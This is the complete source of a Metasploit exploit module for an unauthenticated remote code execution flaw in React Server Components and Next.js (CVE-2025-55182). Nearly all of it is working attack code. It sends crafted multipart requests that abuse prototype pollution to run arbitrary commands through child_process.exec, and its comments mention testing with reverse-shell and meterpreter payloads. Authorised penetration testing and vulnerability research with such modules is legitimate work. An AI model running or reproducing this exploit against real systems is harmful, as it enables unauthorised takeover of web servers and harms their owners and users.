##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Unauthenticated RCE in React and Next.js',
        'Description' => %q{
          A critical unauthenticated Remote Code Execution (RCE) vulnerability exists in React Server
          Components (RSC) Flight protocol. The vulnerability allows attackers to achieve prototype
          pollution during deserialization of RSC payloads by sending specially crafted multipart
          requests with "__proto__", "constructor", or "prototype" as module names.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Maksim Rogov', # Metasploit Module
          'Lachlan Davidson', # Vulnerability Discovery
          'Adam Kues', # Detection Mechanism
          'maple3142' # Exploit
        ],
        'References' => [
          ['CVE', '2025-55182'],
          ['CVE', '2025-66478'],
          ['URL', 'https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components'],
          ['URL', 'https://slcyber.io/research-center/high-fidelity-detection-mechanism-for-rsc-next-js-rce-cve-2025-55182-cve-2025-66478/'],
          ['URL', 'https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3']
        ],
        'Platform' => ['multi'],
        'Arch' => [ARCH_CMD],
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => ['unix', 'linux'],
              'DefaultOptions' => {
                'FETCH_COMMAND' => 'WGET'
              }
              # Tested with cmd/unix/reverse_bash
              # Tested with cmd/linux/http/x64/meterpreter/reverse_tcp
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => ['windows']
              # Tested with cmd/windows/http/x64/meterpreter/reverse_tcp
            }
          ],
        ],
        'Payload' => {
          'BadChars' => '"'
        },
        'DefaultTarget' => 0,
        'DisclosureDate' => '2025-12-03',
        'Notes' => {
          'AKA' => ['React2Shell'],
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Path to the React App', '/']),
      ]
    )
  end

  def check
    post_data = Rex::MIME::Message.new
    post_data.add_part('{}', nil, nil, 'form-data; name="1"')
    post_data.add_part('["$1::"]', nil, nil, 'form-data; name="0"')

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'POST',
      'headers' => { 'Next-Action' => '' },
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'data' => post_data.to_s
    )
    return CheckCode::Unknown("#{peer} - No response from web service") unless res

    resp_text = res.get_html_document.text
    return CheckCode::Appears if res.code == 500 && resp_text.include?('E{"digest":"')

    CheckCode::Safe("The target #{target_uri} is not vulnerable")
  end

  def generate_random_index
    random_reason = -Rex::Text.rand_text_numeric(1, '0').to_i

    random_ref_idx = nil
    loop do
      random_ref_idx = Rex::Text.rand_text_numeric(1, '0').to_i
      break unless random_ref_idx == 2
    end

    {
      random_reason: random_reason,
      random_ref_idx: random_ref_idx
    }
  end

  def build_content(random_ref_idx, random_reason, cmd)
    {
      'then' => "$#{random_ref_idx}:__proto__:then",
      'status' => 'resolved_model',
      'reason' => random_reason,
      'value' => { 'then' => '$B' }.to_json,
      '_response' => {
        '_prefix' =>
          "process.mainModule.require('child_process').exec(\"#{cmd}\",{detached:true,stdio:'ignore'},function(){});",
        '_chunks' => '$Q2',
        '_formData' => {
          'get' => "$#{random_ref_idx}:constructor:constructor"
        }
      }
    }.to_json
  end

  def build_post_data(random_ref_idx, content)
    post_data = Rex::MIME::Message.new
    post_data.add_part(content, nil, nil, 'form-data; name="0"')

    (1..(random_ref_idx - 1)).each do |i|
      post_data.add_part('null', nil, nil, "form-data; name=\"#{i}\"")
    end

    post_data.add_part('"$@0"', nil, nil, "form-data; name=\"#{random_ref_idx}\"")
    post_data.add_part('[]', nil, nil, "form-data; name=\"#{random_ref_idx + 1}\"")

    post_data
  end

  def exploit
    cmd = payload.encoded

    random_index = generate_random_index
    content = build_content(random_index[:random_ref_idx], random_index[:random_reason], cmd)
    post_data = build_post_data(random_index[:random_ref_idx], content)

    send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'POST',
      'headers' => { 'Next-Action' => '' },
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'data' => post_data.to_s
    )
  end
end
